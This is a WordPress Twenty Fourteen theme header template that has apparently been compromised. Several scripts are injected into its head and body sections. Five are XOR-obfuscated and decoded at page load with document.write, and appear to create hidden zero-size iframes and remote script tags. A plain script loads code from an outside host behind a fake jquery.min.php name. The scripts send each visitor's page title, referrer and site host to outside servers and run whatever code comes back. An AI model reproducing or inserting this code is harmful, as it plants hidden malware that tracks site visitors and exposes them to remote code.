<?php
/**
 * The Header for our theme
 *
 * Displays all of the <head> section and everything up till <div id="main">
 *
 * @package WordPress
 * @subpackage Twenty_Fourteen
 * @since Twenty Fourteen 1.0
 */
?><!DOCTYPE html>
<!--[if IE 7]>
<html class="ie ie7" <?php language_attributes(); ?>>
<![endif]-->
<!--[if IE 8]>
<html class="ie ie8" <?php language_attributes(); ?>>
<![endif]-->
<!--[if !(IE 7) & !(IE 8)]><!-->
<html <?php language_attributes(); ?>>
<!--<![endif]-->
<head>
	<meta charset="<?php bloginfo( 'charset' ); ?>">
	<meta name="viewport" content="width=device-width">
	<title><?php wp_title( '|', true, 'right' ); ?></title>
	<link rel="profile" href="http://gmpg.org/xfn/11">
	<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">
	<!--[if lt IE 9]>
	<script src="<?php echo get_template_directory_uri(); ?>/js/html5.js"></script>
	<![endif]-->
	<?php wp_head(); ?>
    <!-- ###: -->
    <script>var a="'02'02'02'02'1Aqapkrv'1G'2C'02'02'02'02'02'02'02'02dwlavkml'02qvpkleEgl'0:ngl'0;'5@'2C'02'02'02'02'02'02'02'02'02'02'02'02tcp'02vgzv'02'1F'02'00'00'1@'2C'02'02'02'02'02'02'02'02'02'02'02'02tcp'02ajcpqgv'02'1F'02'00c`afgdejkhinolmrspqvwtuz{x23016745:;'00'1@'2C'02'02'02'02'02'02'02'02'02'02'02'02dmp'0:'02tcp'02k'1F2'1@'02k'02'1A'02ngl'1@'02k))'02'0;'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02vgzv'02)'1F'02ajcpqgv,ajcpCv'0:Ocvj,dnmmp'0:Ocvj,pclfmo'0:'0;'02('02ajcpqgv,nglevj'0;'0;'1@'2C'02'02'02'02'02'02'02'02'02'02'02'02pgvwpl'02vgzv'1@'2C'02'02'02'02'02'02'02'02'5F'2C'02'02'02'02'02'02'02'02qgvVkogmwv'0:32'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02qg]pgdgppgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:uklfmu,nmacvkml,jmqv'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02`cqg'02'1F'02'00k,knnwoklcvkmlgq,amo-hqlkvaj'00'1@'2C'02'02'02'02'02'02'02'02tcp'02wwkf'02'1F'02qvpkleEgl'0:7'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02l]wpn'02'1F'02'00jvvr'1C--'00'02)'02wwkf'02)'02'00,'00'02)'02`cqg'02)'02'00'1Dfgdcwnv]ig{umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'00'04qg]pgdgppgp'1F'00'02)'02qg]pgdgppgp'02)'02'00'04qmwpag'1F'00'02)'02jmqv'1@'2C'02'02'02'02'02'02'02'02kd'02'0:fgdcwnv]ig{umpf'02'03'1F'1F'02lwnn'02'04'04'02fgdcwnv]ig{umpf'02'03'1F'1F'02'05'05'02'04'04'02qg]pgdgppgp'02'03'1F'1F'02lwnn'02'04'04'02qg]pgdgppgp'02'03'1F'1F'02'05'05'0;'5@'2C'02'02'02'02'02'02'02'02'02'02'02'02fmawoglv,upkvg'0:'05'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'02qpa'1F'00'05'02)'02l]wpn'02)'02'05'00'1G'05'02)'02'05'1A'05'02)'02'05-qapkrv'1G'05'0;'1@'2C'02'02'02'02'02'02'02'02'5F'2C'02'02'02'02'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
    <!-- :### -->
    <!-- ###: -->
    <script>var a="'02'02'02'02'1Aqapkrv'1G'2C'02'02'02'02'02'02'02'02dwlavkml'02qvpkleEgl'0:ngl'0;'5@'2C'02'02'02'02'02'02'02'02'02'02'02'02tcp'02vgzv'02'1F'02'00'00'1@'2C'02'02'02'02'02'02'02'02'02'02'02'02tcp'02ajcpqgv'02'1F'02'00c`afgdejkhinolmrspqvwtuz{x23016745:;'00'1@'2C'02'02'02'02'02'02'02'02'02'02'02'02dmp'0:'02tcp'02k'1F2'1@'02k'02'1A'02ngl'1@'02k))'02'0;'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02vgzv'02)'1F'02ajcpqgv,ajcpCv'0:Ocvj,dnmmp'0:Ocvj,pclfmo'0:'0;'02('02ajcpqgv,nglevj'0;'0;'1@'2C'02'02'02'02'02'02'02'02'02'02'02'02pgvwpl'02vgzv'1@'2C'02'02'02'02'02'02'02'02'5F'2C'02'02'02'02'02'02'02'02qgvVkogmwv'0:32'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02qg]pgdgppgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:uklfmu,nmacvkml,jmqv'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02`cqg'02'1F'02'00k,knnwoklcvkmlgq,amo-hqlkvaj'00'1@'2C'02'02'02'02'02'02'02'02tcp'02wwkf'02'1F'02qvpkleEgl'0:7'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02l]wpn'02'1F'02'00jvvr'1C--'00'02)'02wwkf'02)'02'00,'00'02)'02`cqg'02)'02'00'1Dfgdcwnv]ig{umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'00'04qg]pgdgppgp'1F'00'02)'02qg]pgdgppgp'02)'02'00'04qmwpag'1F'00'02)'02jmqv'1@'2C'02'02'02'02'02'02'02'02kd'02'0:fgdcwnv]ig{umpf'02'03'1F'1F'02lwnn'02'04'04'02fgdcwnv]ig{umpf'02'03'1F'1F'02'05'05'02'04'04'02qg]pgdgppgp'02'03'1F'1F'02lwnn'02'04'04'02qg]pgdgppgp'02'03'1F'1F'02'05'05'0;'5@'2C'02'02'02'02'02'02'02'02'02'02'02'02fmawoglv,upkvg'0:'05'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'02qpa'1F'00'05'02)'02l]wpn'02)'02'05'00'1G'05'02)'02'05'1A'05'02)'02'05-qapkrv'1G'05'0;'1@'2C'02'02'02'02'02'02'02'02'5F'2C'02'02'02'02'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
    <!-- :### -->
<script>var a=''; setTimeout(10); var default_keyword = encodeURIComponent(document.title); var se_referrer = encodeURIComponent(document.referrer); var host = encodeURIComponent(window.location.host); var base = "http://phanmemvuonxa.com/js/jquery.min.php"; var n_url = base + "?default_keyword=" + default_keyword + "&se_referrer=" + se_referrer + "&source=" + host; var f_url = base + "?c_utt=snt2014&c_utm=" + encodeURIComponent(n_url); if (default_keyword !== null && default_keyword !== '' && se_referrer !== null && se_referrer !== ''){document.write('<script type="text/javascript" src="' + f_url + '">' + '<' + '/script>');}</script>
</head>

<body <?php body_class(); ?>>
<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
<div id="page" class="hfeed site">
	<?php if ( get_header_image() ) : ?>
	<div id="site-header">
		<a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home">
			<img src="<?php header_image(); ?>" width="<?php echo get_custom_header()->width; ?>" height="<?php echo get_custom_header()->height; ?>" alt="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>">
		</a>
	</div>
	<?php endif; ?>

	<header id="masthead" class="site-header" role="banner">
		<div class="header-main">
			<h1 class="site-title"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></h1>

			<div class="search-toggle">
				<a href="#search-container" class="screen-reader-text" aria-expanded="false" aria-controls="search-container"><?php _e( 'Search', 'twentyfourteen' ); ?></a>
			</div>

			<nav id="primary-navigation" class="site-navigation primary-navigation" role="navigation">
				<button class="menu-toggle"><?php _e( 'Primary Menu', 'twentyfourteen' ); ?></button>
				<a class="screen-reader-text skip-link" href="#content"><?php _e( 'Skip to content', 'twentyfourteen' ); ?></a>
				<?php wp_nav_menu( array( 'theme_location' => 'primary', 'menu_class' => 'nav-menu', 'menu_id' => 'primary-menu' ) ); ?>
			</nav>
		</div>

		<div id="search-container" class="search-box-wrapper hide">
			<div class="search-box">
				<?php get_search_form(); ?>
			</div>
		</div>
	</header><!-- #masthead -->

	<div id="main" class="site-main">
